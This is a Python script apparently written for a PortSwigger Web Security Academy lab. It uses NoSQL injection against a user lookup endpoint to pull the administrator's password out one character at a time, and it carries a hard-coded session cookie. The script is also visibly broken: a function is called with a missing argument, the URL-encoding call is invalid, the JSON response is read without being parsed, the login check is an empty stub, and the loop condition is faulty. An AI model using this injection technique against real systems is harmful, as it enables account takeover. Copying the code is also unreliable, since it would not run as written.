import requests 
import time 
import string


base_url = 'https://0a1100b3049cd32681200cc1008f0091.web-security-academy.net'
username = 'administrator'
query_string = "/user/lookup?user="
max_password_length = 100
weak_user_cookie = "session=eguhC3xTSyCAAiJMNGGStJ9UQGNaasyh"

# def login_with_weak_user(username: str, password: str):
    

def try_login(username: str, password: str):
    is_login_succeed = False
    
    return is_login_succeed

def enumerate_current_char(c: str):
    # check if the response is valid
    payload = generate_payload(c)
    full_url = base_url + query_string + payload 
    
    headers = {
    'Cookie': weak_user_cookie
    }
    res = requests.get(full_url, headers=headers, timeout=10)
    
    
    return res.status_code == 200 and res.json["username"] != None


def generate_payload(char: str, char_index: int):
    return f"{username}\' || this.password[{char_index}] == \'{char}\' || \'a\' == \'b".encode("url")

def main():
    password_found = False 
    password = ""
    current_char_index = 0
    
    while not password_found or (len(password) >= max_password_length):
        valid_chars = list(string.printable)
        
        for i in range(0, len(valid_chars)):
            current_char = valid_chars[i]
                               
            found_current_char = enumerate_current_char(current_char) 
            
            if found_current_char:
                password += current_char
                current_char_index += 1
                
                password_found = try_login(username, password)

                if password_found:
                    break
                
            else:
                time.sleep(5)
                
                
        
    
    if password_found:
        print(f"[+] The password for the user '{username}' is '{password}'")
    else:
        print("No password found")
        
main()